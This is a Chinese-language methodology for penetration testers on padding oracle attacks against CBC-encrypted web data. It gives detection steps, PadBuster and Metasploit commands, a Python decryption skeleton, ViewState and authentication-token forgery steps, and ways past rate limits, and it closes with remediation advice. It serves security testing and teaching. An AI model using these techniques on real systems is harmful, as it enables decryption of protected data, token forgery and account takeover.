# Padding Oracle 攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 Padding Oracle 攻击检测和利用流程。

## 1.2 适用范围

本文档适用于使用 CBC 模式加密的 Web 应用和 API 服务。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

Padding Oracle 攻击利用加密系统对填充验证的错误响应差异，逐步解密加密内容或构造有效密文。

**本质问题**：
- CBC 模式填充验证泄露信息
- 错误响应可区分填充错误和其他错误
- 缺少完整性验证

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-327 | 使用已损坏或有风险的加密算法 |
| CWE-209 | 错误消息泄露敏感信息 |

## 2.2 攻击常见于哪些业务场景

| 场景 | 风险点 | 潜在危害 |
|-----|-------|---------|
| ASP.NET ViewState | __VIEWSTATE 参数 | 数据解密/篡改 |
| Java JSF | javax.faces.ViewState | 数据解密/篡改 |
| 自定义加密 | Cookie/参数加密 | 会话劫持 |
| API 响应 | 加密响应数据 | 数据泄露 |
| 认证令牌 | 加密 Token | 令牌伪造 |

## 2.3 漏洞发现方法

### 2.3.1 Oracle 检测

```bash
# 发送修改的密文
# 观察响应差异

# 原始密文
ciphertext = "AABBCCDD..."

# 修改最后一个字节
modified = "AABBCCD0"

# 如果返回不同错误：
# - "Invalid padding" → 存在 Oracle
# - "Decryption failed" → 可能不存在
```

### 2.3.2 自动化工具检测

```bash
# 使用 PadBuster
padBuster.pl http://target.com/page \
    "AABBCCDD..." 8 \
    -cookies -encoding 0

# 使用 Metasploit
use auxiliary/scanner/http/aspnet_viewstate_oracle
```

### 2.3.3 手动检测

```bash
# 1. 获取原始密文
# 2. 修改最后一个字节
# 3. 发送并记录响应
# 4. 恢复最后一个字节
# 5. 修改倒数第二个字节
# 6. 重复直到解密所有字节
```

## 2.4 漏洞利用方法

### 2.4.1 密文解密

```python
# Padding Oracle 解密脚本框架
def padding_oracle_decrypt(ciphertext, iv, oracle_url):
    plaintext = b''
    
    for block_num in range(len(ciphertext) // 16):
        block = ciphertext[block_num*16:(block_num+1)*16]
        prev_block = iv if block_num == 0 else ciphertext[(block_num-1)*16:block_num*16]
        
        decrypted_block = b''
        for pad_byte in range(1, 17):
            for guess in range(256):
                # 构造修改的 IV
                modified_iv = modify_iv(prev_block, decrypted_block, pad_byte, guess)
                
                # 发送请求
                response = send_request(oracle_url, modified_iv + block)
                
                # 检查是否是有效填充
                if is_valid_padding(response):
                    # 计算明文字节
                    plain_byte = guess ^ pad_byte
                    decrypted_block = bytes([plain_byte]) + decrypted_block
                    break
        
        plaintext += decrypted_block
    
    return plaintext
```

### 2.4.2 ASP.NET ViewState 攻击

```bash
# 使用 PadBuster 解密 ViewState
padBuster.pl http://target.com/page.aspx \
    "/wEPDwUK..." 8 \
    -cookies -encoding 1

# 解密后可以：
# 1. 查看 ViewState 内容
# 2. 修改 ViewState
# 3. 重新加密提交
```

### 2.4.3 认证令牌伪造

```bash
# 如果认证 Token 使用 CBC 加密
# 可以：
# 1. 解密现有 Token
# 2. 修改用户 ID/角色
# 3. 重新加密构造新 Token
# 4. 使用伪造 Token 登录
```

### 2.4.4 加密数据篡改

```
原始明文：{"user_id": 123, "role": "user"}
         ↓ 解密
中间人修改：{"user_id": 123, "role": "admin"}
         ↓ 重新加密
新密文：有效加密的 admin Token
```

## 2.5 漏洞利用绕过方法

### 2.5.1 速率限制绕过

```bash
# Padding Oracle 需要大量请求
# 如果有限制：
# 1. 使用代理池
# 2. 慢速攻击
# 3. 分布式攻击
```

### 2.5.2 错误消息模糊

```bash
# 如果错误消息被模糊
# 尝试：
# 1. 响应时间差异
# 2. 响应长度差异
# 3. HTTP 状态码差异
```

---

# 第三部分：附录

## 3.1 Padding Oracle 测试检查清单

```
□ 检测加密数据存在
□ 测试错误响应差异
□ 测试填充验证 Oracle
□ 尝试自动化解密
□ 测试 Token 伪造
□ 测试数据篡改
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| PadBuster | Padding Oracle 攻击 | https://github.com/AonCyberLabs/PadBuster |
| Metasploit | 漏洞利用框架 | https://www.metasploit.com/ |
| Burp Suite | 手动测试 | https://portswigger.net/burp |

## 3.3 修复建议

1. **使用 AEAD 模式** - GCM、CCM 等认证加密
2. **添加 HMAC** - 验证密文完整性
3. **统一错误消息** - 不区分填充错误和其他错误
4. **速率限制** - 限制解密尝试

---

**参考资源**：
- [OWASP Padding Oracle Attack](https://owasp.org/www-community/attacks/Padding_oracle_attack)
- [CWE-327](https://cwe.mitre.org/data/definitions/327.html)
